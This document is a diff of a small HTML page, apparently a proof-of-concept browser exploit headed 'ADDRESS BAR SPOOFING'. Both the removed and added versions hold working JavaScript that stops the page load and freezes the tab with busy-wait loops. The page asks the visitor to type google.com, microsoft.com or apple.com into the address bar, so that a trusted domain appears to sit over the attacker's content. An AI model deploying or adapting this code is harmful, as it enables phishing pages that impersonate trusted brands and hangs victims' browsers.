@@ -3,60 +3,36 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>testerss</title>
+    <title>TESTER</title>
   </head>
-  <body>
-    <button
-      id="startBtn"
-      style="
-        position: fixed;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        padding: 15px 30px;
-        font-size: 18px;
-        background: #007aff;
-        color: #fff;
-        border: none;
-        border-radius: 10px;
-        cursor: pointer;
-        z-index: 10000;
-      "
-    >
-      CLICK HERE
-    </button>
 
-    <script>
-      document.getElementById("startBtn").onclick = function () {
-        this.remove();
+  <body style="margin:0;padding:0;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center;font-family:system-ui">
+    <div>
+      <h1>ADDRESS BAR SPOOFING</h1>
+      <h2>CLICK YOUR REFRESH BUTTON / CTRL + R</h2>
 
-        document.open();
-        document.write(`
-        <!DOCTYPE html>
-        <html>
-        <head><title>page demo</title></head>
-        <body style="margin:0;padding:0;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center;font-family:system-ui">
-          <div>
-            <h1 style="font-size:96px;font-weight:bold;color:red;margin:0 0 30px 0">THIS IS NOT APPLE</h1>
-          </div>
-        </body>
-        </html>
-      `);
-        document.close();
+      <p>AND PLEASE TYPE THIS MANUALLY IN THE ADDRESS BAR:</p>
+      <h2>google.com, microsoft.com, apple.com</h2>
+    </div>
 
-        setTimeout(() => {
-          try {
-            window.stop();
-          } catch (e) {}
-          try {
-            const sab = new SharedArrayBuffer(4);
-            const view = new Int32Array(sab);
-            Atomics.wait(view, 0, 0, 99999);
-          } catch (e) {
-            while (true) {}
-          }
-        }, 1);
-      };
-    </script>
+<script>
+  function freezeChunk(ms) {
+    const end = performance.now() + ms;
+    while (performance.now() < end) {}
+  }
+
+  function loopFreeze() {
+    freezeChunk(40000);
+    setTimeout(loopFreeze, 100); 
+  }
+
+  setTimeout(() => {
+    try {
+      window.stop();
+    } catch (e) {}
+
+    loopFreeze();
+  }, 10);
+</script>
   </body>
 </html>
